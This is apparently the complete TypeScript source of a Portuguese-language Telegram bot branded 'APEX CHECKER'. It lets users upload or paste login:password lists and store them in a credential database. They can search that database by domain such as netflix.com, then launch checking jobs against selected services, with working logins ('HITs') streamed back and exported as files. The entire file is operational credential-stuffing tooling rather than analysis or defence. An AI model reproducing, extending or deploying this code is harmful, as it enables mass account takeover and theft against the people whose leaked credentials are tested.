import { Telegraf, Markup, type Context } from "telegraf";
import { BOT_TOKEN, API_BASE, BOT_NAME, CHECKER_TARGETS } from "./config.js";
import { message } from "telegraf/filters";
import EventSource from "eventsource";

if (!BOT_TOKEN) {
  console.error("❌ TELEGRAM_BOT_TOKEN is not set. Set it in environment variables.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ── Session State ─────────────────────────────────────────────────────────────
interface Session {
  credentials?: string[];
  activeJobId?: string;
  hits:         string[];
  fails:        string[];
  errors:       string[];
  running:      boolean;
  msgId?:       number;
  chatId?:      number;
  es?:          EventSource;
}
const sessions = new Map<number, Session>();

function getSession(userId: number): Session {
  if (!sessions.has(userId)) {
    sessions.set(userId, { hits: [], fails: [], errors: [], running: false });
  }
  return sessions.get(userId)!;
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function esc(s: string) {
  return s.replace(/[&<>"']/g, c =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!),
  );
}

function buildProgressMsg(
  target: string,
  total: number,
  done: number,
  hits: string[],
  fails: string[],
  errors: string[],
): string {
  const pct = total > 0 ? Math.round((done / total) * 100) : 0;
  const bar = buildBar(pct);
  const lines = [
    `<b>⚔️ APEX CHECKER — ${esc(target.toUpperCase())}</b>`,
    ``,
    `${bar} <b>${pct}%</b>`,
    `<code>${done}/${total}</code> verificados`,
    ``,
    `✅ <b>HITs</b>: <code>${hits.length}</code>`,
    `❌ <b>FAILs</b>: <code>${fails.length}</code>`,
    `⚠️ <b>ERRORs</b>: <code>${errors.length}</code>`,
  ];
  if (hits.length > 0) {
    lines.push(``, `<b>🎯 Últimos HITs:</b>`);
    hits.slice(-3).forEach(h => lines.push(`<code>${esc(h.split(" | ")[0] ?? h)}</code>`));
  }
  return lines.join("\n");
}

function buildBar(pct: number): string {
  const filled = Math.round(pct / 10);
  return "█".repeat(filled) + "░".repeat(10 - filled);
}

async function editProgress(ctx: Context, chatId: number, msgId: number, text: string) {
  try {
    await ctx.telegram.editMessageText(chatId, msgId, undefined, text, {
      parse_mode: "HTML",
    });
  } catch {/* ignore edit conflicts */}
}

// ── /start ────────────────────────────────────────────────────────────────────
bot.start(async ctx => {
  await ctx.replyWithHTML(
    `<b>⚔️ ${BOT_NAME}</b>\n\n` +
    `Bem-vindo ao checker de credenciais.\n\n` +
    `<b>Comandos:</b>\n` +
    `/checker — Iniciar verificação (envie um arquivo)\n` +
    `/url &lt;domínio&gt; — Buscar credenciais no DB e checar\n` +
    `/import — Importar lista de credenciais para o DB\n` +
    `/stats — Estatísticas do banco de credenciais\n` +
    `/hits — Ver HITs da última sessão\n` +
    `/fails — Ver FAILs da última sessão\n` +
    `/errors — Ver ERRORs da última sessão\n` +
    `/stop — Parar checker ativo\n\n` +
    `<i>Envie um arquivo .txt com credenciais (login:senha) para começar.</i>`,
  );
});

// ── /help ─────────────────────────────────────────────────────────────────────
bot.command("help", async ctx => ctx.replyWithHTML(
  `<b>📖 Comandos disponíveis</b>\n\n` +
  `/checker — upload de arquivo → escolher serviço → verificar\n` +
  `/url github.com — busca no DB + checker automático\n` +
  `/import — importar lista para o banco\n` +
  `/stats — estatísticas do DB\n` +
  `/hits — HITs da última sessão\n` +
  `/fails — FAILs da última sessão\n` +
  `/errors — ERRORs da última sessão\n` +
  `/stop — para o checker ativo`,
));

// ── /stats ────────────────────────────────────────────────────────────────────
bot.command("stats", async ctx => {
  try {
    const r = await fetch(`${API_BASE}/api/credentials/stats`);
    const data = await r.json() as { total: number; topDomains: { domain: string; count: number }[] };
    const domains = data.topDomains.slice(0, 5).map(
      (d, i) => `${i + 1}. <code>${esc(d.domain)}</code> — <b>${d.count}</b>`
    ).join("\n");
    await ctx.replyWithHTML(
      `<b>📊 Banco de Credenciais</b>\n\n` +
      `Total: <b>${data.total.toLocaleString("pt-BR")}</b> credenciais\n\n` +
      `<b>Top domínios:</b>\n${domains || "Nenhum ainda"}`,
    );
  } catch (e) {
    await ctx.reply(`❌ Erro: ${String(e)}`);
  }
});

// ── /hits, /fails, /errors ────────────────────────────────────────────────────
bot.command("hits", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.hits.length === 0) { await ctx.reply("Nenhum HIT na última sessão."); return; }
  const text = s.hits.slice(0, 50).map(h => `✅ ${h}`).join("\n");
  await ctx.replyWithHTML(`<b>✅ HITs (${s.hits.length})</b>\n\n<code>${esc(text)}</code>`);
});

bot.command("fails", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.fails.length === 0) { await ctx.reply("Nenhum FAIL na última sessão."); return; }
  const text = s.fails.slice(0, 50).map(h => `❌ ${h}`).join("\n");
  await ctx.replyWithHTML(`<b>❌ FAILs (${s.fails.length})</b>\n\n<code>${esc(text)}</code>`);
});

bot.command("errors", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.errors.length === 0) { await ctx.reply("Nenhum ERROR na última sessão."); return; }
  const text = s.errors.slice(0, 50).map(h => `⚠️ ${h}`).join("\n");
  await ctx.replyWithHTML(`<b>⚠️ ERRORs (${s.errors.length})</b>\n\n<code>${esc(text)}</code>`);
});

// ── /stop ─────────────────────────────────────────────────────────────────────
bot.command("stop", async ctx => {
  const s = getSession(ctx.from!.id);
  if (!s.running) { await ctx.reply("Nenhum checker ativo."); return; }
  s.es?.close();
  s.running = false;
  if (s.activeJobId) {
    await fetch(`${API_BASE}/api/checker/stop/${s.activeJobId}`, { method: "POST" }).catch(() => {});
  }
  await ctx.replyWithHTML(
    `<b>🛑 Checker parado</b>\n\n` +
    `✅ HITs: <b>${s.hits.length}</b>\n` +
    `❌ FAILs: <b>${s.fails.length}</b>\n` +
    `⚠️ ERRORs: <b>${s.errors.length}</b>`,
  );
});

// ── /import ───────────────────────────────────────────────────────────────────
bot.command("import", async ctx => {
  await ctx.reply("📂 Envie o arquivo .txt com credenciais (login:senha por linha) para importar ao DB.");
  getSession(ctx.from!.id).credentials = undefined;
});

// ── /checker ─────────────────────────────────────────────────────────────────
bot.command("checker", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.running) {
    await ctx.reply("⚠️ Já existe um checker rodando. Use /stop para parar.");
    return;
  }
  if (s.credentials && s.credentials.length > 0) {
    await showTargetMenu(ctx, s.credentials.length);
  } else {
    await ctx.reply("📂 Envie o arquivo .txt com as credenciais (login:senha) para começar.");
  }
});

// ── /url <domain> ─────────────────────────────────────────────────────────────
bot.command("url", async ctx => {
  const args = ctx.message.text.split(/\s+/).slice(1);
  if (args.length === 0) {
    await ctx.reply("Uso: /url <domínio>  (ex: /url netflix.com)");
    return;
  }
  const domain = args[0];
  const waitMsg = await ctx.replyWithHTML(`🔍 Buscando credenciais para <code>${esc(domain)}</code>...`);

  try {
    const r = await fetch(`${API_BASE}/api/credentials/search?domain=${encodeURIComponent(domain)}&limit=500`);
    const data = await r.json() as { count: number; credentials: { login: string; password: string }[] };
    if (data.count === 0) {
      await ctx.telegram.editMessageText(
        waitMsg.chat.id, waitMsg.message_id, undefined,
        `❌ Nenhuma credencial encontrada para <code>${esc(domain)}</code> no banco.`, { parse_mode: "HTML" },
      );
      return;
    }
    const creds = data.credentials.map(c => `${c.login}:${c.password}`);
    const s = getSession(ctx.from!.id);
    s.credentials = creds;
    await ctx.telegram.editMessageText(
      waitMsg.chat.id, waitMsg.message_id, undefined,
      `✅ <b>${data.count}</b> credenciais encontradas para <code>${esc(domain)}</code>.\n\nEscolha o serviço para verificar:`,
      { parse_mode: "HTML" },
    );
    await showTargetMenu(ctx, creds.length);
  } catch (e) {
    await ctx.telegram.editMessageText(
      waitMsg.chat.id, waitMsg.message_id, undefined, `❌ Erro: ${String(e)}`,
    );
  }
});

// ── File handler (credential lists + import) ──────────────────────────────────
bot.on(message("document"), async ctx => {
  const doc = ctx.message.document;
  if (!doc.file_name?.match(/\.(txt|csv|log)$/i) && doc.mime_type !== "text/plain") {
    await ctx.reply("⚠️ Envie um arquivo .txt com credenciais.");
    return;
  }

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const raw = await fetch(fileLink.toString()).then(r => r.text());
    const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":"));

    if (lines.length === 0) {
      await ctx.reply("❌ Nenhuma credencial válida (formato login:senha) encontrada.");
      return;
    }

    const s = getSession(ctx.from!.id);
    s.credentials = lines;

    // Show two options: checker or import to DB
    await ctx.replyWithHTML(
      `📄 <b>${doc.file_name}</b>\n<b>${lines.length}</b> credenciais carregadas.\n\nO que fazer?`,
      Markup.inlineKeyboard([
        [Markup.button.callback("⚔️ Checar agora", "file_check"),
         Markup.button.callback("💾 Importar para DB", "file_import")],
      ]),
    );
  } catch (e) {
    await ctx.reply(`❌ Erro ao ler arquivo: ${String(e)}`);
  }
});

// ── Callbacks ─────────────────────────────────────────────────────────────────
bot.action("file_check", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
  await showTargetMenu(ctx, s.credentials.length);
});

bot.action("file_import", async ctx => {
  await ctx.answerCbQuery("Importando...");
  const s = getSession(ctx.from!.id);
  if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
  try {
    const body = s.credentials.join("\n");
    const r = await fetch(`${API_BASE}/api/credentials/import?source=telegram`, {
      method: "POST",
      headers: { "Content-Type": "text/plain; charset=utf-8" },
      body,
    });
    const data = await r.json() as { inserted: number; skipped: number };
    await ctx.replyWithHTML(
      `✅ <b>Importado!</b>\n` +
      `Inserido: <b>${data.inserted}</b>\n` +
      `Ignorado: <b>${data.skipped}</b>`,
    );
  } catch (e) {
    await ctx.reply(`❌ Erro ao importar: ${String(e)}`);
  }
});

// Target selection callbacks
CHECKER_TARGETS.forEach(t => {
  bot.action(`target_${t.id}`, async ctx => {
    await ctx.answerCbQuery(`Iniciando ${t.label}...`);
    const s = getSession(ctx.from!.id);
    if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
    if (s.running) { await ctx.reply("Pare o checker atual com /stop primeiro."); return; }
    await startChecker(ctx, t.id, t.label, s);
  });
});

// ── Target menu ───────────────────────────────────────────────────────────────
async function showTargetMenu(ctx: Context, count: number) {
  // Group by category
  const cats: Record<string, { id: string; label: string }[]> = {};
  CHECKER_TARGETS.forEach(t => {
    (cats[t.cat] ??= []).push({ id: t.id, label: t.label });
  });

  const rows = Object.entries(cats).map(([cat, targets]) =>
    targets.map(t => Markup.button.callback(t.label, `target_${t.id}`)),
  );

  await ctx.replyWithHTML(
    `⚔️ <b>Selecione o alvo</b>\n<code>${count}</code> credenciais prontas:`,
    Markup.inlineKeyboard(rows),
  );
}

// ── Start checker SSE session ─────────────────────────────────────────────────
async function startChecker(ctx: Context, target: string, label: string, s: Session) {
  s.hits   = [];
  s.fails  = [];
  s.errors = [];
  s.running = true;

  const creds  = s.credentials!;
  const chatId = ctx.chat!.id;
  const userId = ctx.from!.id;

  const initMsg = await ctx.replyWithHTML(
    buildProgressMsg(label, creds.length, 0, [], [], []),
  );
  s.msgId  = initMsg.message_id;
  s.chatId = chatId;

  // POST checker start
  let jobId: string;
  try {
    const r = await fetch(`${API_BASE}/api/checker/start`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ target, credentials: creds }),
    });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const data = await r.json() as { jobId: string };
    jobId = data.jobId;
    s.activeJobId = jobId;
  } catch (e) {
    s.running = false;
    await ctx.reply(`❌ Erro ao iniciar checker: ${String(e)}`);
    return;
  }

  // SSE stream
  const es = new EventSource(`${API_BASE}/api/checker/stream/${jobId}`);
  s.es = es;

  let done      = 0;
  let lastEdit  = Date.now();
  const EDIT_INTERVAL = 3000;

  es.onmessage = async (ev) => {
    try {
      const data = JSON.parse(ev.data as string) as {
        type: string;
        status?: string;
        credential?: string;
        detail?: string;
        total?: number;
        done?: number;
      };
      if (data.type === "result") {
        done++;
        const cred = `${data.credential ?? "?"} | ${data.detail ?? ""}`;
        if (data.status === "HIT")        s.hits.push(cred);
        else if (data.status === "FAIL")  s.fails.push(cred);
        else                              s.errors.push(cred);

        const now = Date.now();
        if (now - lastEdit > EDIT_INTERVAL) {
          lastEdit = now;
          await editProgress(ctx, chatId, s.msgId!, buildProgressMsg(label, creds.length, done, s.hits, s.fails, s.errors));
        }
      } else if (data.type === "done" || data.type === "end") {
        es.close();
        s.running = false;
        await sendFinalReport(ctx, chatId, s.msgId!, label, creds.length, s.hits, s.fails, s.errors, userId);
      }
    } catch { /**/ }
  };

  es.onerror = async () => {
    if (!s.running) return;
    es.close();
    s.running = false;
    await sendFinalReport(ctx, chatId, s.msgId!, label, creds.length, s.hits, s.fails, s.errors, userId);
  };
}

async function sendFinalReport(
  ctx: Context,
  chatId: number,
  msgId: number,
  label: string,
  total: number,
  hits: string[],
  fails: string[],
  errors: string[],
  _userId: number,
) {
  const hitRate = total > 0 ? ((hits.length / total) * 100).toFixed(1) : "0.0";
  const text = [
    `<b>✅ CHECKER FINALIZADO — ${esc(label)}</b>`,
    ``,
    `📊 Total: <b>${total}</b> | Taxa HIT: <b>${hitRate}%</b>`,
    ``,
    `✅ HITs:   <b>${hits.length}</b>`,
    `❌ FAILs:  <b>${fails.length}</b>`,
    `⚠️ ERRORs: <b>${errors.length}</b>`,
    ``,
    hits.length > 0 ? `<b>🎯 Primeiros HITs:</b>` : "",
    ...hits.slice(0, 5).map(h => `<code>${esc(h)}</code>`),
    ``,
    `<i>Use /hits, /fails, /errors para ver mais</i>`,
  ].filter(l => l !== undefined).join("\n");

  await editProgress(ctx, chatId, msgId, text);

  // Send hits as file if many
  if (hits.length > 5) {
    const buf = Buffer.from(hits.join("\n"), "utf-8");
    await ctx.telegram.sendDocument(chatId, { source: buf, filename: `hits_${label.replace(/\s+/g, "_")}.txt` },
      { caption: `✅ ${hits.length} HITs — ${label}`, parse_mode: "HTML" },
    );
  }
}

// ── Inline text credentials (paste directly) ──────────────────────────────────
bot.on(message("text"), async ctx => {
  const text = ctx.message.text;
  // Skip commands
  if (text.startsWith("/")) return;
  // Check if it looks like credentials (multiple login:pass lines)
  const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":") && !l.startsWith("/"));
  if (lines.length >= 2) {
    const s = getSession(ctx.from!.id);
    s.credentials = lines;
    await ctx.replyWithHTML(
      `📋 <b>${lines.length}</b> credenciais carregadas.\n\nO que fazer?`,
      Markup.inlineKeyboard([
        [Markup.button.callback("⚔️ Checar agora", "file_check"),
         Markup.button.callback("💾 Importar para DB", "file_import")],
      ]),
    );
  }
});

// ── Launch ────────────────────────────────────────────────────────────────────
bot.launch(() => {
  console.log("🤖 Telegram bot running...");
}).catch(err => {
  console.error("Bot launch error:", err);
  process.exit(1);
});

process.once("SIGINT",  () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
